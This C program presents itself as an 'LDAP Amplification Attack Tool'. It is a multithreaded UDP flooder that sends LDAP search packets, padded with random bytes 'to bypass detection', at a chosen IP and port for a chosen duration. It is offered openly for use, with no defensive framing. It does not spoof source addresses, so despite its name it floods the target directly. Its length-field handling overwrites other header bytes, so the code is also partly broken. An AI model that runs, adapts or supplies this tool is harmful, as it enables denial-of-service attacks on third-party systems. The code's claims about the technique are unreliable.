#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

// LDAP query template for amplification attack
// Standard LDAP search request that triggers large responses
unsigned char ldap_template[] = {
    0x30, 0x84, 0x00, 0x00, 0x00, 0x00,  // LDAP message header
    0x02, 0x01, 0x01,                      // Message ID
    0x63, 0x84, 0x00, 0x00, 0x00, 0x00,  // Search request
    0x04, 0x00,                          // Base object (empty)
    0x0a, 0x01, 0x00,                    // Scope: baseObject
    0x0a, 0x01, 0x02,                    // Dereference aliases
    0x02, 0x01, 0x00,                    // Size limit
    0x02, 0x01, 0x00,                    // Time limit
    0x01, 0x01, 0x00,                    // Types only: false
    0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x63, 0x6c, 0x61, 0x73, 0x73,  // Filter: (objectclass=*)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

struct attack_params {
    char target_ip[16];
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
    int running;
};

// Function to build LDAP request packet
unsigned char* create_ldap_request(int packet_size, int* actual_size) {
    unsigned char* packet = malloc(packet_size);
    if (!packet) return NULL;
    
    memset(packet, 0, packet_size);
    
    // Copy LDAP template
    int template_size = sizeof(ldap_template);
    if (packet_size > template_size) {
        memcpy(packet, ldap_template, template_size);
        
        // Fill remaining space with random data to bypass detection
        for (int i = template_size; i < packet_size; i++) {
            packet[i] = rand() % 256;
        }
    } else {
        memcpy(packet, ldap_template, packet_size);
    }
    
    // Update LDAP length fields
    int remaining = packet_size - 8;
    packet[2] = (remaining >> 16) & 0xFF;
    packet[3] = (remaining >> 8) & 0xFF;
    packet[4] = remaining & 0xFF;
    packet[8] = (remaining >> 16) & 0xFF;
    packet[9] = (remaining >> 8) & 0xFF;
    packet[10] = remaining & 0xFF;
    
    *actual_size = packet_size;
    return packet;
}

// Thread function - performs the actual attack
void* ldap_attack(void* arg) {
    struct attack_params* params = (struct attack_params*)arg;
    int sock;
    struct sockaddr_in target;
    unsigned char* packet;
    int packet_size;
    time_t start_time, current_time;
    int packets_sent = 0;
    
    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        printf("Thread %d: Socket creation failed\n", params->thread_id);
        pthread_exit(NULL);
    }
    
    // Configure target address
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(params->target_port);
    target.sin_addr.s_addr = inet_addr(params->target_ip);
    
    // Prepare attack packet
    packet = create_ldap_request(params->packet_size, &packet_size);
    if (!packet) {
        close(sock);
        pthread_exit(NULL);
    }
    
    start_time = time(NULL);
    
    // Attack loop - send packets until duration expires
    while (params->running) {
        current_time = time(NULL);
        if (current_time - start_time >= params->duration) {
            break;
        }
        
        // Send LDAP request
        if (sendto(sock, packet, packet_size, 0, 
                   (struct sockaddr*)&target, sizeof(target)) >= 0) {
            packets_sent++;
        }
        
        // Minimal delay to prevent CPU overload
        usleep(100);
    }
    
    printf("Thread %d sent %d packets\n", params->thread_id, packets_sent);
    
    free(packet);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    pthread_t* threads;
    struct attack_params* params;
    int threads_count;
    int i;
    
    // Check command line arguments
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME THREADS PACKET\n", argv[0]);
        printf("LDAP Amplification Attack\n");
        printf("\n");
        printf("Arguments:\n");
        printf("  IP       - Target IP address\n");
        printf("  PORT     - Target port (typically 389 for LDAP)\n");
        printf("  TIME     - Attack duration in seconds\n");
        printf("  THREADS  - Number of attack threads\n");
        printf("  PACKET   - Packet size in bytes\n");
        return 1;
    }
    
    // Parse arguments
    char* target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    threads_count = atoi(argv[4]);
    int packet_size = atoi(argv[5]);
    
    // Validate arguments
    if (target_port <= 0 || target_port > 65535) {
        printf("Invalid port number\n");
        return 1;
    }
    
    if (duration <= 0) {
        printf("Invalid duration\n");
        return 1;
    }
    
    if (threads_count <= 0 || threads_count > 1000) {
        printf("Invalid thread count (1-1000)\n");
        return 1;
    }
    
    if (packet_size < 64 || packet_size > 65535) {
        printf("Invalid packet size (64-65535)\n");
        return 1;
    }
    
    // Display attack information
    printf("\n========================================\n");
    printf("LDAP Amplification Attack Tool\n");
    printf("========================================\n");
    printf("Target: %s:%d\n", target_ip, target_port);
    printf("Duration: %d seconds\n", duration);
    printf("Threads: %d\n", threads_count);
    printf("Packet Size: %d bytes\n", packet_size);
    printf("========================================\n");
    printf("Starting attack...\n\n");
    
    // Allocate memory for threads and parameters
    threads = malloc(threads_count * sizeof(pthread_t));
    params = malloc(threads_count * sizeof(struct attack_params));
    
    if (!threads || !params) {
        printf("Memory allocation failed\n");
        free(threads);
        free(params);
        return 1;
    }
    
    // Seed random number generator
    srand(time(NULL));
    
    // Create attack threads
    for (i = 0; i < threads_count; i++) {
        memset(&params[i], 0, sizeof(struct attack_params));
        strncpy(params[i].target_ip, target_ip, 15);
        params[i].target_ip[15] = '\0';
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i + 1;
        params[i].running = 1;
        
        if (pthread_create(&threads[i], NULL, ldap_attack, &params[i]) != 0) {
            printf("Failed to create thread %d\n", i + 1);
            params[i].running = 0;
        }
    }
    
    // Wait for attack duration
    sleep(duration);
    
    // Signal threads to stop
    printf("\nStopping attack threads...\n");
    for (i = 0; i < threads_count; i++) {
        params[i].running = 0;
    }
    
    // Wait for all threads to finish
    for (i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n========================================\n");
    printf("LDAP Amplification Attack Completed\n");
    printf("========================================\n");
    
    // Cleanup
    free(threads);
    free(params);
    
    return 0;
} 